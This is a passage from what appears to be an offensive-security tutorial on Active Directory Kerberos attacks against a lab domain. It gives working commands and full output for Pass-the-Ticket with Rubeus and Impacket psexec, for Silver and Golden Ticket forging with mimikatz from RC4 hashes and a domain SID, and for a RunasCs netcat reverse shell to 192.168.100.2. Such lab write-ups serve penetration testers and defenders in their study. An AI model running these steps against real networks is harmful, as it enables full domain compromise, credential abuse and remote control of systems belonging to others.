+<p>The TGT was saved as <code>administrator.kirbi</code>. This ticket can now be used for <strong>Pass-The-Ticket</strong>.</p><br/>
+<h2>Pass The Ticket</h2><br/>
+<p>For example, in the earlier Kerberoasting attack, we used credentials to obtain tickets. Now, we'll use the previously saved ticket for Pass-The-Ticket and replicate the Kerberoasting attack:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">kerberoasting</span><span class="o">.</span><span class="n">txt</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Kerberoasting</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">a</span> <span class="n">TGT</span> <span class="o">/</span><span class="n">ticket</span> <span class="n">to</span> <span class="n">request</span> <span class="n">service</span> <span class="n">tickets</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Ticket</span> <span class="n">successfully</span> <span class="n">imported</span><span class="err">!</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">path</span> <span class="s1">'LDAP://dc01.elswixcorp.local/DC=elswixcorp,DC=local'</span> <span class="k">for</span> <span class="s1">'(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Total</span> <span class="n">kerberoastable</span> <span class="n">users</span> <span class="p">:</span> <span class="mi">1</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SamAccountName</span>         <span class="p">:</span> <span class="n">ellie</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DistinguishedName</span>      <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">ellie</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ServicePrincipalName</span>   <span class="p">:</span> <span class="n">http</span><span class="o">/</span><span class="n">ellie</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PwdLastSet</span>             <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">7</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span> <span class="n">PM</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Supported</span> <span class="n">ETypes</span>       <span class="p">:</span> <span class="n">RC4_HMAC_DEFAULT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Hash</span> <span class="n">written</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">kerberoasting</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Roasted</span> <span class="n">hashes</span> <span class="n">written</span> <span class="n">to</span> <span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">kerberoasting</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+<p>You can also use this ticket on Linux. First, download the <code>administrator.kirbi</code> file to your Linux machine. To use it, you need to convert it into the ccache format. Fortunately, Impacket provides a script called <code>ticketConverter.py</code> for this purpose:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ticketConverter</span><span class="o">.</span><span class="n">py</span> <span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">converting</span> <span class="n">kirbi</span> <span class="n">to</span> <span class="n">ccache</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">done</span>
+</pre></div>
+<p>After converting the ticket, export the <code>KRB5CCNAME</code> variable and use <code>psexec.py</code> to gain access to the system:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">FSwxVQJk</span><span class="o">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">bAch</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">bAch</span><span class="o">.....</span>
+<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.587</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+
+<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">Windows</span><span class="evrm">\</span><span class="evrm">system32</span><span class="evrm">&gt;</span>
+</pre></div>
+<h2>Silver Ticket</h2><br/>
+<p>You can generate a <strong>Silver Ticket</strong> using <code>mimikatz</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="s2">"kerberos::golden /domain:elswixcorp.local /sid:S-1-5-21-1672168468-2738507895-2086515240 /rc4:96A44FFBF8BB1958B54D4D04C9C14F95 /user:administrator /service:MSSQLSVC /target:dc01.elswixcorp.local"</span> <span class="s2">"exit"</span>
+
+  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span>
+ <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="o">.</span><span class="n">letoux</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span> <span class="p">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="o">.</span><span class="n">com</span> <span class="o">***/</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="n"># kerberos::golden /domain:elswixcorp.local /sid:S-1-5-21-1672168468-2738507895-2086515240 /rc4:96A44FFBF8BB1958B54D4D04C9C14F95 /user:administrator /service:MSSQLSVC /target:dc01.elswixcorp.local</span>
+<span class="n">User</span>      <span class="p">:</span> <span class="n">administrator</span>
+<span class="n">Domain</span>    <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="p">(</span><span class="n">ELSWIXCORP</span><span class="p">)</span>
+<span class="n">SID</span>       <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span>
+<span class="n">User</span> <span class="n">Id</span>   <span class="p">:</span> <span class="mi">500</span>
+<span class="n">Groups</span> <span class="n">Id</span> <span class="p">:</span> <span class="o">*</span><span class="mi">513</span> <span class="mi">512</span> <span class="mi">520</span> <span class="mi">518</span> <span class="mi">519</span>
+<span class="n">ServiceKey</span><span class="p">:</span> <span class="mi">96</span><span class="n">a44ffbf8bb1958b54d4d04c9c14f95</span> <span class="o">-</span> <span class="n">rc4_hmac_nt</span>
+<span class="n">Service</span>   <span class="p">:</span> <span class="n">MSSQLSVC</span>
+<span class="n">Target</span>    <span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Lifetime</span>  <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">1</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">41</span> <span class="n">PM</span> <span class="p">;</span> <span class="mi">12</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2034</span> <span class="mi">1</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">41</span> <span class="n">PM</span> <span class="p">;</span> <span class="mi">12</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2034</span> <span class="mi">1</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">41</span> <span class="n">PM</span>
+<span class="o">-&gt;</span> <span class="n">Ticket</span> <span class="p">:</span> <span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span>
+
+ <span class="o">*</span> <span class="n">PAC</span> <span class="n">generated</span>
+ <span class="o">*</span> <span class="n">PAC</span> <span class="n">signed</span>
+ <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">generated</span>
+ <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">encrypted</span>
+ <span class="o">*</span> <span class="n">KrbCred</span> <span class="n">generated</span>
+
+<span class="n">Final</span> <span class="n">Ticket</span> <span class="n">Saved</span> <span class="n">to</span> <span class="n">file</span> <span class="err">!</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c1"># exit</span>
+<span class="n">Bye</span><span class="err">!</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span>
+</pre></div>
+<p>This command creates a <code>.kirbi</code> file with the Service Ticket. You can then download it to your Linux machine, convert it to ccache format, and use it for authentication:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Encryption</span> <span class="n">required</span><span class="p">,</span> <span class="n">switching</span> <span class="n">to</span> <span class="n">TLS</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">LANGUAGE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">us_english</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">PACKETSIZE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">16192</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">dc01</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">database</span> <span class="n">context</span> <span class="n">to</span> <span class="s1">'master'</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">dc01</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">language</span> <span class="n">setting</span> <span class="n">to</span> <span class="n">us_english</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ACK</span><span class="p">:</span> <span class="n">Result</span><span class="p">:</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="p">(</span><span class="mi">160</span> <span class="mi">3232</span><span class="p">)</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">SQL</span> <span class="p">(</span><span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
+<h2>Golden Ticket</h2><br/>
+<p>You can create a <strong>Golden Ticket</strong> using <code>mimikatz</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span> <span class="s2">"kerberos::golden /domain:elswixcorp.local /sid:S-1-5-21-1672168468-2738507895-2086515240  /rc4:a88e9a174ee94f60f932fec548a84ccb /user:administrator"</span> <span class="s2">"exit"</span>
+
+  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span>
+ <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="o">.</span><span class="n">letoux</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span> <span class="p">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="o">.</span><span class="n">com</span> <span class="o">***/</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="n"># kerberos::golden /domain:elswixcorp.local /sid:S-1-5-21-1672168468-2738507895-2086515240  /rc4:a88e9a174ee94f60f932fec548a84ccb /user:administrator</span>
+<span class="n">User</span>      <span class="p">:</span> <span class="n">administrator</span>
+<span class="n">Domain</span>    <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="p">(</span><span class="n">ELSWIXCORP</span><span class="p">)</span>
+<span class="n">SID</span>       <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span>
+<span class="n">User</span> <span class="n">Id</span>   <span class="p">:</span> <span class="mi">500</span>
+<span class="n">Groups</span> <span class="n">Id</span> <span class="p">:</span> <span class="o">*</span><span class="mi">513</span> <span class="mi">512</span> <span class="mi">520</span> <span class="mi">518</span> <span class="mi">519</span>
+<span class="n">ServiceKey</span><span class="p">:</span> <span class="n">a88e9a174ee94f60f932fec548a84ccb</span> <span class="o">-</span> <span class="n">rc4_hmac_nt</span>
+<span class="n">Lifetime</span>  <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">1</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">23</span> <span class="n">PM</span> <span class="p">;</span> <span class="mi">12</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2034</span> <span class="mi">1</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">23</span> <span class="n">PM</span> <span class="p">;</span> <span class="mi">12</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2034</span> <span class="mi">1</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">23</span> <span class="n">PM</span>
+<span class="o">-&gt;</span> <span class="n">Ticket</span> <span class="p">:</span> <span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span>
+
+ <span class="o">*</span> <span class="n">PAC</span> <span class="n">generated</span>
+ <span class="o">*</span> <span class="n">PAC</span> <span class="n">signed</span>
+ <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">generated</span>
+ <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">encrypted</span>
+ <span class="o">*</span> <span class="n">KrbCred</span> <span class="n">generated</span>
+
+<span class="n">Final</span> <span class="n">Ticket</span> <span class="n">Saved</span> <span class="n">to</span> <span class="n">file</span> <span class="err">!</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c1"># exit</span>
+<span class="n">Bye</span><span class="err">!</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span>
+</pre></div>
+<p>After creating the <code>ticket.kirbi</code> file, you can download it, convert it to ccache format, and use it for authentication:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">JWnrRWgA</span><span class="o">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">Ovps</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">Ovps</span><span class="o">.....</span>
+<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.587</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+
+<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">Windows</span><span class="evrm">\</span><span class="evrm">system32</span><span class="evrm">&gt;</span>
+</pre></div>
+<h2>Windows - Pass The Ticket</h2><br/>
+<p>So far, we've demonstrated Pass-The-Ticket on Linux. We generated the tickets on the Windows machine, downloaded them to a Linux machine, converted them, and used them for authentication. However, Pass-The-Ticket can also be performed directly on Windows, though it is slightly more complex.</p><br/>
+<h3>Challenges with Remote Sessions</h3><br/>
+<p>When using a remote shell like <code>Evil-WinRM</code>, certain limitations arise because it runs under a remote process. Remote processes often have restrictions that can limit attacks.</p><br/>
+<p>For instance, even after importing a valid TGT into a remote session, actions like accessing administrative shares (<code>\\dc01\admin$</code>) or performing <code>DCSync</code> attacks may fail. This occurs because remote sessions use <strong>Network Logon</strong> (logon type 3), which restricts token usage for sensitive operations.</p><br/>
+<h3>Bypassing Remote Session Limitations</h3><br/>
+<p>To bypass these restrictions, you must operate within a <strong>local process</strong> context. A local process does not inherit the same restrictions, enabling full use of Kerberos tickets. You can achieve this using <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>.</p><br/>
+<p>For example, using the <code>-l 9</code> option allows you to start a process with logon type 9 (new credentials logon):</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">RunasCs</span><span class="o">.</span><span class="n">exe</span> <span class="n">x</span> <span class="n">x</span> <span class="o">-</span><span class="n">l</span> <span class="mi">9</span> <span class="s2">"C:\Temp</span><span class="se">\n</span><span class="s2">c.exe -e cmd 192.168.100.2 3001"</span>
+</pre></div>
+<p>Here, I used a netcat binary to send a reverse shell under logon type 9. This method doesn't require valid credentials because it uses the current account context.</p><br/>
+<p>Once in a local context, you can re-import your Kerberos ticket using tools like <code>Rubeus</code> or <code>Mimikatz</code>. For example, let's request a TGT for the administrator account using <code>Rubeus</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span> <span class="o">/</span><span class="n">ptt</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+
+   <span class="n">______</span>        <span class="n">_</span>                      
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>                     
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span> 
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">rc4_hmac</span> <span class="nb">hash</span><span class="p">:</span> <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
